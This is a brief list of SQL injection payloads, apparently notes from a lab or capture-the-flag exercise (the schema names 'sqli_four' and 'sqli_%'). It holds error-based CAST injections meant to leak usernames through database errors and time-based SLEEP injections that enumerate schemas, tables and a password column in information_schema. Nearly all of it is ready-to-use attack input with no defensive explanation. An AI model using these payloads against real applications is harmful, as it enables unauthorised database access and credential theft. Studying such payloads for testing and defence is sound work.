

-- CAST() on password string caused exception and shows data in error
' AND CAST((SELECT 1) AS int)--
' AND 1=CAST((SELECT username FROM users) AS int)--
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

' OR 1=(SELECT SLEEP(3) FROM information_schema.SCHEMATA WHERE SCHEMA_NAME like 'sqli_%' LIMIT 1);--
' OR 1=(SELECT SLEEP(3) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'sqli_four' AND TABLE_NAME = 'users' LIMIT 1);--
' OR 1=(SELECT SLEEP(3) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'sqli_four' AND TABLE_NAME = 'users' AND COLUMN_NAME = 'password' LIMIT 1);--


